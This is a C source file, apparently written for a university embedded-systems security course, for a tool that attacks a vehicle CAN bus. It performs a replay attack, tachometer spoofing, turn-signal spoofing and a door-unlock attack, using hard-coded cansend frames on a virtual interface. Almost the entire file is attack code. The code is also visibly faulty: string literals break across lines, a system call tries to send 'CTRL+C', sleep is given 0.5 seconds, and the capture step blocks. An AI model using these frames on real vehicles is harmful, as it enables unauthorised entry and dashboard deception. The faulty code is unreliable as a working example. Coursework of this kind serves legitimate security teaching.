/*
 * This software is produced
 * for the purposes of hijacking and attacking the CAN bus 
 * for 4 major attack vectors.
 * 
 * 1) Replay Attack
 * 2) Tachometer Spoofing
 * 3) Turn Signal Spoofing
 * 4) Door Unlock Attack
 * 
 * This software is completed for the purposes of 
 * Dr. Jian Liu's ECE469/569 Mobile and Embedded Systems Security course.
 * 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include "lib.h"

int attack_menu(void){
    int attack_selection;
    printf("
        Select an attack to perform.\n
        Make sure you are connected to the victim vehicle's CAN bus.\n
        Enter 1 through 4.\n
        * 1) Replay Attack\n
        * 2) Tachometer Spoofing\n
        * 3) Turn Signal Spoofing\n
        * 4) Door Unlock Attack\n
        ");
    scanf("%d", &attack_selection);
    return attack_selection;
}

void replay_attack(void){
    system("candump vcan0 -l -o mylogfile.log");

    int logging_time = 0;
    printf("How long to log for in seconds?\n");
    scanf("%d", &logging_time);
    printf("Recording...\n");
    sleep(logging_time);
    system("CTRL+C");
    printf("Replaying...\n");

    system("canplayer -I mylogfile.log");
}

void tachometer_spoofing(void){
    //spoofs tachometer to the max RPM
    while(true){
        system("cansend vcan0 244#000000FFFF");
    }
}

void turnsignal_spoofing(void){
    //turns on hazards then blinks the left signal and repeats
    while(true){
        system("cansend vcan0 188#03");
        sleep(0.5);
        system("cansend vcan0 188#01");
        sleep(0.5);
    }
}

void door_unlock_attack(void){
    int door_selection;
    printf("
        Which door to unlock?\n
        1) Driver\n
        2) Passenger\n
        3) Driver Rear\n
        4) Passenger Rear\n
        5) All\n
        6) Lock All\n
        ");
    scanf("%d", &door_selection);
    switch(door_selection){
        case 1: 
            system("cansend vcan0 19B#00000E");
            break;
        case 2:
            system("cansend vcan0 19B#00000D");
            break;
        case 3:
            system("cansend vcan0 19B#00000B");
            break;
        case 4:
            system("cansend vcan0 19B#000007");
            break;
        case 5:
            system("cansend vcan0 19B#000000");
            break;
        case 6:
            system("cansend vcan0 19B#00000F");
            break;
        default:
            break;
    }
}

int main(int argc, char **argv)
{
    int attack_selection = attack_menu();

    switch(attack_selection){
        case 1:
            replay_attack();
            break;
        case 2:
            tachometer_spoofing();
            break;
        case 3:
            turnsignal_spoofing();
            break;
        case 4:
            door_unlock_attack();
            break;
        default:
            break;
    }

	return 0;
}
